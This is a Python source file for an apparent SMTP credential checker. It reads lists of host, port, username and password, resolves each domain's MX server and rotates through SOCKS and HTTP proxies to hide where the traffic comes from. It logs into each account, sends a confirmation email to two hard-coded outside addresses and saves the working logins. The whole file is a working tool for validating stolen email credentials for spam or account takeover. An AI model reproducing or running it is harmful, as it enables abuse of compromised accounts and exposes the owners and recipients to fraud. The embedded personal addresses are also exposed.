import os
import re
import smtplib
import socks
import socket
import threading
import queue
import time
from collections import defaultdict
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from concurrent.futures import ThreadPoolExecutor
from EEPro import Engine
from servers import Credentials, MX_Server

proxy_queue = queue.Queue()
result_queue = queue.Queue()
mx_server_queue = queue.Queue()  # Manage MX servers for proxy search
proxy_map = {}  # Map MX servers to assigned proxies
proxy_map_lock = threading.Lock()  # Ensure safe access
threads = []  # Track active threads
successful_credentials = set()  # Track successfully authenticated credentials

engine = Engine()


def load_credentials(file_path):
	smtps = engine.read_file(file_path)
	if smtps is None:
		engine.logger.error("No valid SMTP credentials loaded.")
		return []
	else:
		engine.logger.info("Loading SMTP credentials...")
		credentials = []
		for line in smtps:
			parts = line.strip().split('|')
			if len(parts) == 4:
				username = parts[2].strip()
				if '@' not in username:
					engine.logger.warning(f"Invalid username format: {username}")
					continue
				host = parts[0]
				port = int(parts[1])
				password = parts[3]
				domain = username.split('@')[1].strip().lower()
				details = Credentials(host, port, username, password, domain)
				credentials.append(details)
		engine.logger.info(f"Loaded {len(credentials)} SMTP credentials.")
		return credentials


def group_by_host(credentials):
	grouped = defaultdict(list)
	domain_cache = {}

	for credential in credentials:
		if re.match(r"[^@]+@[^@]+\.[^@]+", credential.username) and engine.filter_spam(credential.username.split('@')[0].strip()):
			domain = credential.username.split('@')[1].strip().lower()
			if not engine.is_banned_tld(domain):
				if domain in domain_cache:
					mx_server = domain_cache[domain]
				else:
					mx_server = engine.get_mx_servers(domain)
					domain_cache[domain] = mx_server
				if mx_server is not None:
					key = (mx_server, credential.port)
					grouped[key].append(credential)
	print(f"{len(grouped)} Servers found")
	return grouped

def refresh_proxies(grouped_credentials):
	"""
	Dynamically search for proxies for MX servers, processing three at a time in parallel.
	"""
	def find_and_queue_proxy(mx_server, port):
		"""
		Find a valid proxy for a specific MX server and queue it if successful.
		"""
		engine.logger.info(f"Searching proxy for MX server {mx_server}:{port}...")
		proxy_list = engine.fetch_proxy()
		if not proxy_list:
			engine.logger.error(f"No proxies available for {mx_server}:{port}. Retrying...")
			return

		proxy = engine.find_valid_proxy(mx_server, port, proxy_list)
		if proxy:
			engine.logger.info(f"Valid proxy found for {mx_server}:{port}: {proxy.host}:{proxy.port}")
			mx_server_obj = MX_Server(mx_server, port)
			proxy_queue.put((proxy, mx_server_obj))
		else:
			engine.logger.warning(f"No valid proxy found for {mx_server}:{port}")

	mx_server_list = list(grouped_credentials.keys())  # Extract all MX servers

	while mx_server_list:
		# Take the first 3 MX servers for processing
		current_batch = mx_server_list[:3]
		mx_server_list = mx_server_list[3:]  # Remove these from the list for next iteration

		# Process the current batch in parallel
		threads = []
		for mx_server, port in current_batch:
			thread = threading.Thread(target=find_and_queue_proxy, args=(mx_server, port), daemon=True)
			thread.start()
			threads.append(thread)

		# Wait for all threads in this batch to finish
		for thread in threads:
			thread.join()

		# Log proxy queue activity
		engine.logger.info(f"Proxies in queue: {proxy_queue.qsize()}")

		time.sleep(30)  # Small delay before processing the next batch


def process_batches(grouped_credentials):
	"""
	Process credentials in batches using proxies assigned to their respective MX servers.
	"""
	while True:
		try:
			proxy, mx_server = proxy_queue.get(timeout=30)
			if proxy is None or mx_server is None:
				engine.logger.warning("No valid proxy retrieved, retrying...")
				proxy_queue.task_done()
				continue

			for (current_mx_server, port), credentials in grouped_credentials.items():
				if current_mx_server == mx_server.host:
					batches = [credentials[i:i + 10] for i in range(0, len(credentials), 10)]
					for batch in batches:
						thread = threading.Thread(
							target=test_smtp_batch,
							args=(current_mx_server, port, batch, proxy)
						)
						thread.start()
						threads.append(thread)
			proxy_queue.task_done()
		except queue.Empty:
			time.sleep(5)
			continue
		except Exception as e:
			engine.logger.error(f"Unexpected error in process_batches: {e}")
			time.sleep(5)


def test_smtp_batch(mx_server, port, batch, proxy):
	"""
	Test a batch of credentials using a specific proxy.
	"""
	for smtp_detail in batch:
		credential_key = f"{smtp_detail.username}"
		if credential_key in successful_credentials:
			engine.logger.info(f"Skipping already authenticated credential: {credential_key}")
			continue
		try:
			match proxy.protocol:
				case 'socks4':
					socks.set_default_proxy(socks.SOCKS4, proxy.host, proxy.port)
				case 'socks5':
					socks.set_default_proxy(socks.SOCKS5, proxy.host, proxy.port)
				case 'http':
					socks.set_default_proxy(socks.PROXY_TYPE_HTTP, proxy.host, proxy.port)
			socks.wrapmodule(smtplib)
			with smtplib.SMTP(mx_server, port, timeout=10) as server:
				server.ehlo(f"{smtp_detail.domain}")
				server.starttls()
				server.ehlo(f"{smtp_detail.domain}")
				server.login(smtp_detail.username, smtp_detail.password)
				msg = MIMEMultipart()
				msg['From'] = smtp_detail.username
				msg['To'] = 'mark.boleigha@outlook.com, donhoenix@gmail.com'
				msg['Subject'] = 'Validation completed'
				body = f"This is a test email to validate the connection for {smtp_detail.username}."
				msg.attach(MIMEText(body, 'plain'))
				server.sendmail(smtp_detail.username, ['mark.boleigha@outlook.com', 'donhoenix@gmail.com'], msg.as_string())
				save_valid_smtp(mx_server, smtp_detail)
				successful_credentials.add(credential_key)
				result_queue.put(f"Success: {smtp_detail.username}")
				server.noop()
		except (smtplib.SMTPException, socket.error) as e:
			engine.logger.error(f"SMTP test failed for {smtp_detail.username}: {e}")
			result_queue.put(f"Failure: {smtp_detail.username} - {e}")


def start_checker(file_path):
	smtp_credentials = load_credentials(file_path)
	if not smtp_credentials:
		engine.logger.error("No valid SMTP credentials loaded.")
		return []

	grouped_credentials = group_by_host(smtp_credentials)

	# Start proxy refresh in a separate thread
	proxy_thread = threading.Thread(target=refresh_proxies, args=(grouped_credentials,), daemon=True)
	proxy_thread.start()
	threads.append(proxy_thread)

	# Start batch processing in another thread
	batch_thread = threading.Thread(target=process_batches, args=(grouped_credentials,), daemon=True)
	batch_thread.start()
	threads.append(batch_thread)

	for thread in threads:
		thread.join()

	results = []
	while not result_queue.empty():
		results.append(result_queue.get())
	return results
